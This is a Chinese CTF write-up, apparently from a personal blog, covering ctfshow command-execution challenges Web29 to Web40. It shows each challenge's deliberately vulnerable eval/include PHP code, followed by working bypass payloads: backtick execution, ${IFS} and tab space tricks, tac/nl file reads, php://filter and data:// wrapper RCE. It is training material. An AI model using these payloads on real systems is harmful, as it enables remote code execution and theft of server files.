



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta name="referrer" content="no-referrer"/>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="Web" />


<link rel="canonical" href="http://blog.g01den.top/posts/53e2b2e1.html">



  <title>
ctfshow-命令执行 - Web狗的自我安慰 |
golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
<meta name="generator" content="Hexo 7.2.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">ctfshow-命令执行
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2024-09-16 21:04:45">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2024-09-16T21:04:45+08:00">2024-09-16</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">golden的部落阁</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
          <img src="https://s2.loli.net/2024/09/16/aDvePzf4rhQ9IRT.png">
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Web/" itemprop="item" rel="index" title="分类于 Web狗的自我安慰"><span itemprop="name">Web狗的自我安慰</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/53e2b2e1.html">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="g01den">
    <meta itemprop="description" content="subtitle写得真好, golden的部落阁">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="golden的部落阁">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="web29"><a class="markdownIt-Anchor" href="#web29">#</a> Web29：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		过滤了文件关键词，通配符绕过，cat f*，用 system 执行，发现没有成功读取，考虑使用 tac 倒序读取，得到 flag。</p>
<p>​		<strong>总结，文件关键词过滤可以考虑使用通配符绕过。</strong></p>
<h1 id="web30"><a class="markdownIt-Anchor" href="#web30">#</a> Web30：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		过滤了 system，并且用的屎 eval 函数。</p>
<p>​		这里先试试反斜杠绕过，似乎无法绕过。</p>
<p>​		那么就试着反引号绕过，echo `ls`; ，成功绕过，之后直接 echo `tac fl*`; 读取 flag。</p>
<h1 id="web31"><a class="markdownIt-Anchor" href="#web31">#</a> Web31：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		这里发现空格，单引号被过滤了，还有小数点，没有过滤反引号，直接反引号绕过，成功绕过 system，cat 被过滤就 tac 读取，空格用 %0a 或者 %09 绕过。</p>
<p>​		前置知识：</p>
<p><strong>空格过滤：</strong></p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%09 符号需要php环境</span></span><br><span class="line">&#123;cat,flag.txt&#125; </span><br><span class="line">cat<span class="built_in">$</span>&#123;IFS&#125;flag.txt</span><br><span class="line">cat<span class="built_in">$</span>IFS<span class="built_in">$</span>9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=<span class="built_in">$</span>&#x27;<span class="keyword">\x</span>20flag.txt&#x27;<span class="built_in">&amp;</span><span class="built_in">&amp;</span>cat<span class="built_in">$</span>kg</span><br><span class="line">(<span class="keyword">\x</span>20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure>
<p><strong>cat 过滤：</strong></p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</span><br></pre></td></tr></table></figure>
<h1 id="web32"><a class="markdownIt-Anchor" href="#web32">#</a> Web32：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		过滤了 system 和反引号还有 echo，这里看似挺严格的，但是 print_r 或者 var_dump 没有过滤，应该可以利用下，但是，system 被过滤了，只有无回显 RCE 了，但是，过滤了左半边括号，这样就没法绕了，试一试不需要括号的语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">die</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;etc/passwd&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>​		<strong>可以配合文件包含来打伪协议，具体 payload 类似下面这样：</strong></p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include&quot;<span class="built_in">$</span><span class="built_in">_</span>GET[url]&quot;?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h1 id="web33"><a class="markdownIt-Anchor" href="#web33">#</a> Web33：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​		多过滤了分号和双引号，反引号和空格等等依然被过滤了，这个时候似乎更难办了，还是打文件包含加伪协议来打：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h1 id="web34"><a class="markdownIt-Anchor" href="#web34">#</a> Web34：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		多过滤了一个冒号，方法同上：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>​		这里解释一下，这里出现冒号依旧绕过了的原因是因为 PHP 把前面的 include 到？&gt; 的认为成一个 get 传参，另一个，也就是 &amp; url 被认为是另一个传参，正则只检测第一个部分，第二个部分就不会检测了。</p>
<h1 id="web35"><a class="markdownIt-Anchor" href="#web35">#</a> Web35：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		小于符号也被过滤了，不过无伤大雅，依旧老样子，因为没有过滤 &gt;，所以依旧能用上面的 payload 打：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h1 id="web36"><a class="markdownIt-Anchor" href="#web36">#</a> Web36：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		这里连带着数字一起过滤了，无伤大雅，继续文件包含一把梭：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h1 id="web37"><a class="markdownIt-Anchor" href="#web37">#</a> Web37：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		文件包含过滤了 flag，这个时候可以考虑 include 一个 data 伪协议输入的命令参数，具体如下：</p>
<blockquote>
<p>data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的 data:// 流会被当作 php 文件执行</p>
</blockquote>
<p>​		<strong>第一：使用通配符绕过 flag：</strong></p>
<blockquote>
<p>?c=data://text/plain,<?php echo system('cat fl*');?><br>
?c=data://text/plain,<?php%20 system('cat fl*');?></p>
</blockquote>
<p>​		<strong>第二：使用 base64 绕过 flag：</strong></p>
<blockquote>
<p>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p>
<p>#base64 解码为 <code>&lt;?php system('cat flag.php');?&gt;</code></p>
</blockquote>
<h1 id="web38"><a class="markdownIt-Anchor" href="#web38">#</a> Web38：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		相较于上一个题多过滤了一层 php，使用 base64 绕过就行：</p>
<blockquote>
<p>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p>
</blockquote>
<p>​		或者，使用短标签绕过：</p>
<blockquote>
<p>?c=data://text/plain,<?= system("tac fla?.???");?></p>
</blockquote>
<h1 id="web39"><a class="markdownIt-Anchor" href="#web39">#</a> Web39：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		过滤了 flag，但是文件包含里存在.php 的后缀，好像无伤大雅，和上一题一样，短标签打。</p>
<blockquote>
<p>/?c=data://text/plain,<?= system("tac fla?.???");?></p>
</blockquote>
<p>​		由于两端合在一起就类似于 <code>&lt;?= system('tac fla*');?&gt;.php</code> ，.php 因为已经被标签闭合在外面，所以不会被当作文件包含的后缀算进去，依旧能进行 RCE。</p>
<h1 id="web40"><a class="markdownIt-Anchor" href="#web40">#</a> Web40：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		过滤了数字，和各种符号，但是过滤似乎有点儿问题，没有过滤英文的括号，过滤成了中文的括号，所以，无参数 RCE，可以一把梭：</p>
